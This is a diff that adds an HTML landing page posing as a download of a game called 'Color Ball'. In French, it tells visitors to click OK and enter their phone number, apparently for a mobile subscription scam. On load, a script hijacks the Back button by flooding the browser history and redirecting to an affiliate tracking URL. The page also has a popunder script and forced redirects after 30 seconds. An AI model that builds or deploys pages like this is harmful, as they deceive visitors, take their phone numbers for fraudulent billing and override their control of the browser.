@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+    <base href="">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Place favicon.ico in the root directory -->
+    <style type="text/css">
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 12px;
+            color: #333333;
+            background-color: #ffffff;
+        }
+
+        a {
+            text-decoration: none;
+            color: #333333;
+        }
+
+        .clear {
+            clear: both;
+        }
+
+        .title {
+            padding: 20px 5px;
+            color: #0080c8;
+            font-size: 25px;
+            line-height: 28px;
+            font-weight: bold;
+        }
+
+        .loadbar {
+            padding: 0px 2px 5px 2px;
+        }
+
+        .imgloadbar {
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .txt {
+            padding: 0px 0px 20px 0px;
+            font-size: 15px;
+            line-height: 19px;
+        }
+
+        .desript {
+            padding: 20px 0px 5px 0px;
+            max-width: 450px;
+        }
+
+        .s1,
+        .s2 {
+            padding: 0px 5px 10px 5px;
+            font-size: 18px;
+            line-height: 20px;
+            text-align: left;
+        }
+
+        .btnwrap {
+            margin: 10px 0px;
+        }
+
+        .bluebtn {
+            max-width: 100px;
+            width: 100%;
+            padding: 8px 0px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -moz-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -o-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -ms-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            -khtml-text-shadow: 0px 1px 0px rgba(0, 0, 0, 0.20);
+            border: 1px solid #296283;
+            border-radius: 5px;
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+            -khtml-border-radius: 5px;
+            background: #3f83b7;
+            background: -moz-linear-gradient(top, #3f83b7 0%, #4b97d1 100%);
+            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #3f83b7), color-stop(100%, #4b97d1));
+            background: -webkit-linear-gradient(top, #3f83b7 0%, #4b97d1 100%);
+            background: -o-linear-gradient(top, #3f83b7 0%, #4b97d1 100%);
+            background: -ms-linear-gradient(top, #3f83b7 0%, #4b97d1 100%);
+            background: linear-gradient(to bottom, #3f83b7 0%, #4b97d1 100%);
+        }
+
+        .bluebtn:hover {
+            background: #4991c8;
+            background: -moz-linear-gradient(top, #4b97d1 0%, #3f83b7 100%);
+            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #4b97d1), color-stop(100%, #3f83b7));
+            background: -webkit-linear-gradient(top, #4b97d1 0%, #3f83b7 100%);
+            background: -o-linear-gradient(top, #4b97d1 0%, #3f83b7 100%);
+            background: -ms-linear-gradient(top, #4b97d1 0%, #3f83b7 100%);
+            background: linear-gradient(to bottom, #4b97d1 0%, #3f83b7 100%);
+        }
+
+        .bluebtn:active {
+            position: relative;
+            top: 1px;
+        }
+    </style>
+    <meta http-equiv="refresh" content="30; url=#landing-url">
+    <title>Color Ball</title>
+
+    <script>
+        var under = 'https://gdboxer.com/c1zvl0k.php?key=e00oxwmhixjorvnedter&visitor_id=${SUBID}&cost={cost}&zoneid={zoneid}&campaignid={campaignid}&survey_exit_type={survey_exit_type}&browser={browser}&subzone_id={subzone_id}&osversion={osversion}&bannerid={bannerid}&language={language}&isp={isp}&user_activity={user_activity}';
+    </script>
+    <script src="backunder.js"></script>
+
+</head>
+
+<body>
+    <center>
+        <div class="container">
+            <div class="title">
+                Color Ball
+            </div>
+
+            <div class="loadbar">
+                <img class="imgloadbar" src="loadbar.gif">
+            </div>
+
+            <!-- <div class="txt">
+                Si votre téléchargement ne démarre pas automatiquement.
+            </div> -->
+
+            <div class="desript">
+                <div class="s1">        Étape 1 : Cliquez sur OK </div>
+                <div class="s2">        Étape 2 : Entrez votre numéro de téléphone</div>
+            </div>
+
+            <div class="btnwrap">
+                <a href="https://gdboxer.com/c1zvl0k.php?lp=1">
+                    <div class="bluebtn">OK</div>
+                </a>
+            </div>
+        </div>
+    </center>
+    <div id="timer" style="display: none;"></div>
+
+
+    </script>
+    <script type="text/javascript">
+
+        // aftr 30sec go to link url page //
+        window.onload = function () {
+            var sec = 30;
+            setInterval(function () {
+                var a = new Date();
+                document.getElementById("timer").innerHTML = sec;
+                sec--;
+                if (sec == 00) {
+                    window.location.href = '#js-landing-url';
+                }
+            }, 1000);
+        }
+        // end //
+    </script>
+
+
+<script>!function () { var a; try { for (a = 0; 10 > a; ++a) { history.pushState({}, "", "#") } onpopstate = function (c) { c.state && location.replace("#https://gdboxer.com/c1zvl0k.php?key=e00oxwmhixjorvnedter&visitor_id=${SUBID}&cost={cost}&zoneid={zoneid}&campaignid={campaignid}&survey_exit_type={survey_exit_type}&browser={browser}&subzone_id={subzone_id}&osversion={osversion}&bannerid={bannerid}&language={language}&isp={isp}&user_activity={user_activity}") } } catch (b) { } }();</script>
+
+
+</body>
+
+</html>
